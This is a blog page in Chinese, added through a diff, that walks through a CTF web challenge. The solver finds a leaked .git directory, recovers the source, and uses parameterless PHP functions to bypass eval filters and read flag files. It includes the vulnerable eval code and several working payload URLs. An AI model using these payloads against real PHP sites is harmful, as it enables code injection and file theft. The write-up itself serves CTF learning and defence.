@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>GXYCTF2020 禁止套娃 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">GXYCTF2020 禁止套娃</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 26, 2020&nbsp;&nbsp;23:39:28</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h5 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h5><ol>
+<li>git源码泄露</li>
+<li>无参数RCE</li>
+</ol>
+<h5 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h5><p>关于无参数RCE的文章可以参考飘零师傅的文章</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;skysec.top&#x2F;2019&#x2F;03&#x2F;29&#x2F;PHP-Parametric-Function-RCE&#x2F;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>简单原理可以用code-breaking上的一道题来简单解释一下。这道题叫phplimit，进入<code>docker-compose.yml</code>所在目录，执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo docker-compose up -d</span></span><br></pre></td></tr></table></figure>
+
+<p>访问8084端口。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>源码很简单：</p>
+<ol>
+<li>接受get请求参数code</li>
+<li>如果符合正则表达式就执行传入的参数</li>
+</ol>
+<p>解释一下正则表达式<code>/[^\W]+\((?R)?\)/</code>：</p>
+<ol>
+<li><p><code>[^\W]</code>表示匹配数字字母下划线（<code>\w</code>表示数字字母下划线，<code>\W</code>表示非数字字母下划线，<code>^</code>在<code>[]</code>中表否定含义）</p>
+</li>
+<li><p><code>(?R)?</code>表示引用当前表达式，即可以用<code>/[^\W]+\((?R)?\)/</code>替换到<code>(?R)</code>的位置，变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;[^\W]+\(&#x2F;[^\W]+\((?R)?\)\)&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><code>(?R)?</code>表示可以有引用也可以没有引用。</p>
+<p>举个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaa()			&#x2F;&#x2F; 表示没有引用</span><br><span class="line">aaa(bbb())		&#x2F;&#x2F; 表示引用1次</span><br><span class="line">aaa(bbb(ccc()))	&#x2F;&#x2F; 表示引用2次</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>这道题要求传入的参数经过<code>preg_replace()</code>正则匹配替换后仅剩下<code>;</code>，所以我们只能传入形如<code>a(b(c()))</code>的参数。这就是无参数RCE。</p>
+<p>这里介绍一种最简单的方法，并介绍几个常用函数：</p>
+<ol>
+<li><p><strong>localeconv()</strong> :  返回一包含本地数字及货币格式信息的数组 </p>
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/3.png" alt="3"></p>
+<p>返回的数组的第一个键值对的值为小数点<code>.</code>符号</p>
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/4.png" alt="4"></p>
+</li>
+<li><p><strong>current()</strong> : 返回数组中的当前元素（单元），每个数组中都有一个内部的指针指向它<strong>当前</strong>元素，初始指向插入到数组中的第一个元素。</p>
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/5.png" alt="5"></p>
+</li>
+<li><p><strong>scandir()</strong> :  返回指定目录中的文件和目录的数组</p>
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/6.png" alt="6"></p>
+<p>在这个目录下并没有发现flag文件，所以想进到上一级目录中，可以用<strong>next()</strong>函数来实现</p>
+</li>
+<li><p><strong>next()</strong> : 把指向当前元素的指针移动到下一个元素的位置，并返回当前元素的值，如果内部指针已经超过数组的最后一个元素，函数返回 false。</p>
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/7.png" alt="7"></p>
+<p>找到了flag，接下来的问题就是如何读取它。</p>
+</li>
+<li><p><strong>array_reverse()</strong> :  将原数组中的元素顺序翻转，创建新的数组并返回。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;print_r(next(array_reverse(scandir(next(scandir(current(localeconv())))))));</span><br></pre></td></tr></table></figure>
+
+<p>将数组反转后再用<strong>next()</strong>将数组指针后移就可以得到flag文件：</p>
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/8.png" alt="8"></p>
+<p>如果要读取文件有多种方法，可以用<strong>show_source()</strong>或者是<strong>highlight_file()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;show_source(next(array_reverse(scandir(next(scandir(current(localeconv())))))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/9.png" alt="9"></p>
+<p>打开错误，提示<strong>No such file or directory</strong>，这是因为现在的目录指向的仍然是<code>index.php</code>所在目录，我们并没有进行切换目录操作，必须进入上一层目录才行。 </p>
+</li>
+<li><p><strong>chcrd()</strong> :  改变当前的目录 ，切换成功会返回<strong>1</strong></p>
+<p><strong>dirname()</strong> :  返回路径中的目录名称部分 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;show_source(next(array_reverse(scandir(dirname(chdir(next(scandir(current(localeconv())))))))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/10.png" alt="10"></p>
+<p>得到flag : <code>flag{e86963ba34687d269b9faf526ce68cd7}</code></p>
+</li>
+</ol>
+<p>当然上面介绍的方法是最简单的方法，这道题其实有很多的解法，找个时间整理出来。但是上面的方法解决这道题已经足够了。</p>
+<p>回到禁止套娃这道题，打开题目，先用字典扫描一下有没有相关php文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 dirsearch.py -u http:&#x2F;&#x2F;51377c23-29fe-44e8-ba65-6af23cc26e15.node3.buuoj.cn&#x2F; -e php</span><br></pre></td></tr></table></figure>
+
+<p>在扫描的过程中发现有<code>.git</code>泄露的情况</p>
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/1.png" alt="1"></p>
+<p>开发人员常常会把源代码提交到远程代码托管网站（如github），部署网站时再从远程托管网站把源码pull到服务器的web目录下，如果粗心忘记删除<code>.git</code>文件，就会造成<code>.git</code>泄露。攻击者可以从<code>.git</code>文件恢复网站的源码，源码里可能会有一些敏感信息，比如数据库信息。</p>
+<p>发现了<code>/.git</code>直接上GitHack</p>
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/2.png" alt="2"></p>
+<p>得到index.php源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>从源码中可以得到以下的信息：</p>
+<blockquote>
+<ol>
+<li>第一个if表示以GET的形式读取参数exp的值</li>
+<li>第二个if过滤了<code>data</code>、<code>filter</code>、<code>php</code>、<code>phar</code>这四个伪协议，禁止通过伪协议读取文件</li>
+<li>第三个if表示我们只能通过无参数函数进入if语句</li>
+<li>第四个if过滤了很多函数</li>
+</ol>
+</blockquote>
+<p>先确定flag在哪里</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/11.png" alt="11"></p>
+<p>看到了flag.php文件，然后我们要读取这个文件。但是它位于倒数第二个位置，倒数第一我们可用<code>end()</code>，对于倒数第二，有这么几种处理方法</p>
+<p><strong>1. array_reverse() + next()</strong> </p>
+<p>这个函数之前已经介绍过了，结合<strong>next()</strong>函数就可以获得flag.php。</p>
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/12.png" alt="12"></p>
+<p><strong>2. array_rand() + array_flip()</strong></p>
+<p><strong>array_rand()</strong> :  返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组 </p>
+<p><strong>array_flip()</strong> :  函数用于反转/交换数组中所有的键名以及它们关联的键值。</p>
+<p>因为这道题中的数组元素不太多，所以用<strong>array_rand(array_flip())</strong>不需要刷新几次就可以得到flag.php。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/imgs/13.png" alt="13"></p>
+<p>最后一步就是读取flag.php的文本内容，可用的函数有：</p>
+<ol>
+<li><code>file_get_contents()</code></li>
+<li><code>highlight_file()</code></li>
+<li><code>show_source()</code></li>
+<li><code>readfile()</code></li>
+</ol>
+<p>但最里层的if过滤了<code>et</code>所以不能用<code>file_get_contents()</code>读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;readfile(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>获得flag : <code>flag{e4c7f285-c400-4f60-8334-dc91e7d771fd}</code></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">https://bantttian.github.io/2020/02/26/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/02/29/CVE-2016-7124-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">CVE-2016-7124 PHP反序列化漏洞</a>
+            
+            
+            <a class="next" rel="next" href="/2020/02/12/CVE-2018-1514X-OpenEMR-5-0-1-%E4%B8%89%E5%A4%84%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">CVE-2018-1514X OpenEMR 5.0.1 三处漏洞复现分析</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
